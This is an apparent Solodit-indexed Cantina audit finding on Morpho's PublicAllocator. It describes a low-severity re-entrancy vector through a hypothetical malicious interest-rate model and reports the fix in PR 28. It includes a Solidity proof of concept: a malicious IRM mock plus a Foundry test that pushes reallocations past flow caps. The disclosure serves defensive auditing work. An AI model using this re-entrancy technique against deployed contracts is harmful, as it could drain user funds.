---
# Core Classification
protocol: Morpho
chain: everychain
category: uncategorized
vulnerability_type: unknown

# Attack Vector Details
attack_type: unknown
affected_component: smart_contract

# Source Information
source: solodit
solodit_id: 40735
audit_firm: Cantina
contest_link: https://cantina.xyz/portfolio/84fb1c99-31ff-4327-9fd4-eeee6cf59ef9
source_link: https://cdn.cantina.xyz/reports/cantina_morpho_public_allocator_feb2024.pdf
github_link: none

# Impact Classification
severity: low
impact: security_vulnerability
exploitability: 0.00
financial_impact: low

# Scoring
quality_score: 0
rarity_score: 0

# Context Tags
tags:

protocol_categories:
  - cdp
  - derivatives
  - dexes
  - services
  - yield_aggregator

# Audit Details
report_date: unknown
finders_count: 2
finders:
  - Jonah Wu
  - StErMi
---

## Vulnerability Title

PublicAllocator.reallocateTo does not revert when an unauthorized market is provided, creating a potential re-entrancy attack vector 

### Overview

See description below for full details.

### Original Finding Content

## PublicAllocator Overview

## Context
`PublicAllocator.sol#L102-L149`

## Description
To solve the liquidity fragmentation on MetaMorpho, the `publicAllocator` allows anyone to move the funds within the pre-configured limit. These limits are checked in the `reallocateTo` function to avoid funds being moved to an authorized market and putting MetaMorpho in an undesired state.

In the `reallocateTo` function, a special case arises when `withdrawnAssets == 0`. In this scenario, the function allows processing any market as long as no funds are withdrawn or supplied to/from the market. However, this introduces a potential attack vector. Similar to the issue "Allocator can drain the MetaMorpho vault if a future IRM queries token balance", the `publicAllocator` calls `morpho.accrueInterests` in the loop, potentially exposing the control flow to malicious users.

Currently, the `AdaptiveCurveIrm` is the only enabled IRM, which wouldn't give users control flow and thus prevent potential attacks. However, consider two hypothetical scenarios:

1. A new IRM is deployed that queries token balances to calculate interest. (This is a reasonable setting, as many IRM systems actually depend on a token's balance).
2. Morpho-blue allows users to permissionlessly deploy their own IRMs.

In both cases, a malicious user can gain control within the `reallocateTo` function, suggesting a potential issue with the validation in the function. The `publicAllocator` determines the end allocation amount based on `MORPHO.expectedSupplyAssets` and the withdrawal amount. If `expectedSupplyAssets` changes after the value is cached, it can lead to different actual allocations. Consequently, `publicAllocator` may distribute more funds than the limit specified by `flowCaps`.

## Proof of Concept
```solidity
contract IrmMock is IIrm {
    uint256 public apr;
    address public vault;
    uint public depositAmount;
    address public loanToken;

    function setApr(uint256 newApr) external {
        apr = newApr;
    }

    function borrowRateView(MarketParams memory, Market memory) public view returns (uint256) {
        return apr / 365 days;
    }

    function borrowRate(MarketParams memory marketParams, Market memory market) external returns (uint256) {
        if(depositAmount != 0) {
            IMetaMorpho vault = IMetaMorpho(vault);
            IERC20(loanToken).approve(address(vault), depositAmount);
            vault.deposit(depositAmount, address(this));
        }
        return borrowRateView(marketParams, market);
    }

    function setMMAddress(address _mm) external {
        vault = _mm;
    }

    function setDepositAmount(uint256 amount) external {
        depositAmount = amount;
    }

    function setLoanToken(address _loanToken) external {
        loanToken = _loanToken;
    }
}

function createFakeMarket() internal returns(MarketParams memory) {
    // create mock IRM
    IrmMock irm = new IrmMock();
    irm.setApr(1e18);
    
    // enable irm on morpho
    vm.prank(MORPHO_OWNER);
    morpho.enableIrm(address(irm));
    
    // create market
    MarketParams memory marketParams = MarketParams({
        loanToken: address(loanToken),
        collateralToken: address(loanToken),
        oracle: address(0),
        irm: address(irm),
        lltv: 0
    });
    
    morpho.createMarket(marketParams);
    return marketParams;
}

function testReentrancyAttackFromPublicAllocator() public {
    _setCap(allMarkets[0], type(uint184).max);
    
    MarketAllocation[] memory allocations = new MarketAllocation[](3);
    allocations[0] = MarketAllocation(idleParams, 0);
    allocations[1] = MarketAllocation(allMarkets[0], INITIAL_DEPOSIT);
    allocations[2] = MarketAllocation(allMarkets[1], 0);
    
    vm.prank(ALLOCATOR);
    vault.reallocate(allocations);
    
    Id firstMarket = allMarkets[0].id();
    MarketParams memory fakeParam;
    
    for(uint i = 0; i < 255; i++) {
        fakeParam = createFakeMarket();
        if(Id.unwrap(fakeParam.id()) > Id.unwrap(firstMarket)) {
            break;
        }
    }
    
    IrmMock irm = IrmMock(fakeParam.irm);
    irm.setDepositAmount(totalAssets);
    irm.setLoanToken(address(loanToken));
    irm.setMMAddress(address(vault));
    
    deal(address(loanToken), address(irm), totalAssets);
    vm.warp(block.timestamp + 1 days);
    
    withdrawals.push(Withdrawal(allMarkets[0], 0));
    withdrawals.push(Withdrawal(fakeParam, 0));
    
    totalAssets = vault.totalAssets();
    totalShares = vault.totalSupply();
    
    uint previousIdleAssets = IMorpho(morpho).expectedSupplyAssets(idleParams, address(vault));
    
    // currentPrice is less than previousPrice
    publicAllocator.reallocateTo(address(vault), withdrawals, idleParams);
    
    uint currentIdleAssets = IMorpho(morpho).expectedSupplyAssets(idleParams, address(vault));
    
    // Logs:
    // previousIdleAssets: 0
    // currentIdleAssets: 400000000000000000000
    //
    assertLt(previousIdleAssets, currentIdleAssets);
}
```

## Recommendation
Recommend adding more sanity checks in `reallocateTo`, following the recommendations in the issue "reallocateTo should perform more sanity checks on the input parameters and vault's configuration".

## References
- Morpho: Addressed in PR 28.
- Cantina Managed: The recommendation has been implemented in PR 28. Now it’s not possible to withdraw from or supply to a non-enabled market.

### Metadata

| Field | Value |
|-------|-------|
| Impact | LOW |
| Quality Score | 0/5 |
| Rarity Score | 0/5 |
| Audit Firm | Cantina |
| Protocol | Morpho |
| Report Date | N/A |
| Finders | Jonah Wu, StErMi |

### Source Links

- **Source**: https://cdn.cantina.xyz/reports/cantina_morpho_public_allocator_feb2024.pdf
- **GitHub**: N/A
- **Contest**: https://cantina.xyz/portfolio/84fb1c99-31ff-4327-9fd4-eeee6cf59ef9

### Keywords for Search

`vulnerability`

